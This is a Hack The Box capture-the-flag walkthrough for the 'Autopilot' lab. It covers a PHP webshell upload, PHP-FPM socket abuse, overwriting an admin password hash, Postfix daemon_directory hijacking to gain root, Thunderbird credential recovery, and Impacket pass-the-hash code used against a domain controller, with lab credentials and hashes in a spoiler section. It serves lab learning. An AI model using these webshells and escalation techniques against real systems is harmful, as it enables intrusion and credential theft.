# HTB Autopilot — Insane

**Platform:** Hack The Box  
**Operating systems:** Linux, Windows Active Directory  
**Difficulty:** Insane  
**Status:** Pwned

> This walkthrough records the route from the supplied foothold to Linux
> root, then through the internal Windows network to the Domain Controller.
> No target or internal IP addresses are included. Credentials and flags are
> in a spoiler section at the end; remove that section before publishing
> publicly.

## Attack chain

```text
Grommunio Files
  └─ PHP upload → webshell as grofiles
      └─ Writable PHP-FPM socket → gromox
          └─ MySQL credentials → temporary Admin API access
              └─ Postfix daemon_directory → Linux root
                  └─ Internal network and Thunderbird credential discovery
                      └─ WS02 local administrator
                          └─ Domain Administrator NT hash
                              └─ DC01 C$ → root.txt
```

## 1. Foothold: Grommunio Files to PHP RCE

Grommunio Web was exposed over HTTPS. The TLS certificate and virtual hosts
identified the associated mail, autodiscovery, and Files services. The
machine-provided account credentials were:

```text
deborah.hernandez : 8F5cgp@tC8g@
```

After signing in to Grommunio Web, I opened Grommunio Files. A direct WebDAV
upload of `.php` was rejected in the initial attempt, so I uploaded the PHP
file through the Files web interface instead.

The webshell was intentionally simple:

```php
<?php system($_GET['cmd']); ?>
```

Files were served from the user data path. I used a hostname-based URL so
the commands do not depend on an instance IP:

```bash
export TARGET='<ACTIVE_INSTANCE_ADDRESS>'
export BASE='https://autopilot.htb'
export FILE_USER='deborah.hernandez'
export WS="${BASE}/files/data/${FILE_USER}/files/shell.php"

rce() {
  curl -sk --resolve "autopilot.htb:443:${TARGET}" \
    --get --data-urlencode "cmd=$1" "$WS"
}

rce 'id'
```

The command output confirmed `grofiles` (UID 462).

## 2. `grofiles` to `gromox` through PHP-FPM

The Grommunio PHP-FPM socket was world-writable:

```text
/run/php-fpm/php-gromox-fpm.sock
```

I wrote a small PHP runner in temporary storage. FastCGI requests pass the
command through the `HTTP_CMD` server variable:

```php
<?php echo shell_exec($_SERVER["HTTP_CMD"]); ?>
```

After uploading a FastCGI client through the Files interface and copying it
to a usable location, I invoked the socket:

```bash
python3 /tmp/fcgi_client.py \
  /run/php-fpm/php-gromox-fpm.sock \
  /tmp/run.php \
  'id'
```

The response ran as `gromox` (UID 475). That account could read the MySQL
adapter configuration:

```bash
python3 /tmp/fcgi_client.py \
  /run/php-fpm/php-gromox-fpm.sock \
  /tmp/run.php \
  'cat /etc/gromox/mysql_adaptor.cfg'
```

The configuration contained the MySQL username, password, and database
name. These were used only for the authorized lab.

## 3. Temporary Grommunio Admin API access

The Admin API was listening on IPv6 loopback:

```text
http://[::1]:8080
```

It authenticated the `admin` user using the Grommunio database. I generated
a temporary SHA-512-crypt password hash:

```bash
openssl passwd -6 '<TEMPORARY_PASSWORD>'
```

Then I used the database credentials from `mysql_adaptor.cfg` to update the
admin user's hash:

```sql
UPDATE users
SET password = '<GENERATED_SHA512_CRYPT_HASH>'
WHERE username = 'admin';
```

For example, save that statement in a file readable by the FastCGI process
and execute it through the Grommunio MySQL account:

```bash
mysql -u grommunio -p'<MYSQL_PASSWORD>' grommunio < /tmp/update-admin.sql
```

Logging in to the API returned a JWT and a CSRF token. The JWT must be sent
in the `grommunioAuthJwt` **cookie**; the API did not accept it in an
`Authorization` header for the configuration changes. Include the returned
token in the `x-csrf-token` header on state-changing requests.

## 4. Linux root through Postfix

The Admin API's database-backed Postfix configuration supported a
file-commit command executed with elevated privileges. Postfix uses
`daemon_directory` to locate `postfix-script`. Pointing this setting to a
directory containing a controlled `postfix-script`, then restarting the
service, resulted in the script running as root.

### The PHP-FPM private `/tmp` gotcha

PHP-FPM ran with `PrivateTmp=yes`. As a result, the `/tmp` seen by PHP-FPM
was private and different from the ordinary `/tmp` seen by Postfix. The
private mount's backing path can be found from the webshell:

```bash
rce "grep ' /tmp ' /proc/self/mountinfo"
```

Use the on-disk path shown on the left of the mount entry as
`daemon_directory`. This generated directory changes between instances and
service starts, so discover it each time rather than copying a stale path.
The scripts need to be copied there and marked executable.

The root script can capture its output somewhere readable through Files:

```sh
#!/bin/sh
{
  id
  cat /root/user.txt
} > /var/lib/grommunio-files/data/deborah.hernandez/files/root-result.txt
chmod 644 /var/lib/grommunio-files/data/deborah.hernandez/files/root-result.txt
exit 0
```

Postfix also expects a `master` executable in its daemon directory. For this
lab, a small shim let the service start:

```sh
#!/bin/sh
exit 0
```

I configured the allowed file commit trigger in the Admin API:

```json
{
  "data": {
    "commit_file": "sudo postconf -e $FILE_S && systemctl reload postfix"
  }
}
```

Then I patched the Postfix file configuration:

```json
{
  "data": {
    "daemon_directory": "<FPM_PRIVATE_TMP_PATH>"
  }
}
```

The relevant API resources were:

```text
PATCH /api/v1/system/dbconf/grommunio-dbconf/postfix/
PATCH /api/v1/system/dbconf/postfix/postfix/
POST  /api/v1/system/dashboard/services/postfix.service/restart
```

A restart request can time out while the service starts. I verified the
result by reading the output file through the webshell:

```bash
rce 'cat /var/lib/grommunio-files/data/deborah.hernandez/files/root-result.txt'
```

This confirmed root execution and returned the Linux user flag.

## 5. Pivot: internal network and WS02

With root execution on the Linux host, I inspected its network configuration
and enumerated the internal subnet:

```bash
rce 'ip -br addr'
rce 'ip route'
```

The internal Windows services were not directly reachable from the external
attacker machine. A reverse SOCKS tunnel and ProxyChains can provide a
convenient pivot; alternatively, an SMB client can run from the Linux host
itself.

The credential trail came from WS02's mail activity. Captured network
traffic showed a WS02 connection to the Grommunio mail server over IMAP.
Inspecting Stephanie Lewis's Thunderbird profile with `firepwd` recovered
the saved mail credential. Password reuse made that credential useful for
local administrator access on WS02.

I confirmed the Windows credential had administrative access by checking
the administrative shares, rather than treating successful SMB
authentication alone as proof:

```text
ADMIN$
C$
```

## 6. Domain Administrator and DC01

After gaining local administrator access on WS02, I enumerated the domain
and recovered the Domain Administrator NT hash. The DC was reachable from
the internal network. In this run, I used the already-root Grommunio host
as the pivot and ran the SMB request there, rather than exposing the
internal service directly to the attack machine.

From a host with a route to the DC, Impacket's SMB client can authenticate
with pass-the-hash:

```bash
impacket-smbclient \
  -hashes ":${DA_NT_HASH}" \
  "AUTOPILOT/Administrator@<DC_HOSTNAME>"
```

At the SMB prompt, I downloaded the Administrator Desktop's `root.txt` from
the `C$` share:

```text
use C$
cd Users
cd Administrator
cd Desktop
get root.txt
```

For a direct SMB request from the Linux host, the same operation can be
performed with Impacket. Replace the hostname with the DC name discovered
during internal enumeration, and supply the recovered NT hash:

```python
from impacket.smbconnection import SMBConnection

dc = "<DC_HOSTNAME>"
nt_hash = "<DOMAIN_ADMINISTRATOR_NT_HASH>"

smb = SMBConnection(dc, dc, sess_port=445, timeout=10)
smb.login("Administrator", "", "AUTOPILOT", "", nt_hash)

contents = bytearray()
smb.getFile(
    "C$",
    r"Users\Administrator\Desktop\root.txt",
    contents.extend,
)
print(contents.decode("utf-8", "replace"))
smb.logoff()
```

I ran the SMB client from the root Postfix-script context and saved its
output into the Grommunio Files data directory so it could be read back
through the webshell. The downloaded file contained the Windows root flag.

## Credentials and flags — spoilers

<details>
<summary>Expand to show recovered values</summary>

### Initial access and service credentials

```text
deborah.hernandez : 8F5cgp@tC8g@
MySQL username     : grommunio
MySQL password     : gDq6z9YVe4nyNRe5
MySQL database     : grommunio
Temporary API pass : Autopilot-HTB-2026!
```

### Windows and domain credentials

```text
Stephanie Lewis / Thunderbird: NKUOji@4bAJw
WS02 local administrator     : Pwn3d!
svc_ldap                      : Brother6-Let-Ship-Been-Take
svc_smime                     : qzK3xTs02G11KSkhCewW
sa-joshua.harris              : 65SskH37nyQ01S
Domain Administrator NT hash : f4e6de2c2312f4608707f3d247c2a285
```

### Flags

```text
Linux user:   8e5f807d9cfc9429f44dcb3dd4xxxxxx
Windows root: 84a068d0549a9c2e35e73bfc51xxxxxx
```

</details>

## Cleanup

After collecting the flags:

1. Restore the original Admin API password hash.
2. Restore Postfix's original `daemon_directory`, remove the temporary
   dbconf trigger, and confirm the service starts normally.
3. Remove the webshell, uploaded helper files, and captured output.
4. Stop any Chisel or ProxyChains processes.

Do not publish the spoiler section with live credentials or flag values.
Remove or redact it before pushing this file to a public GitHub repository.
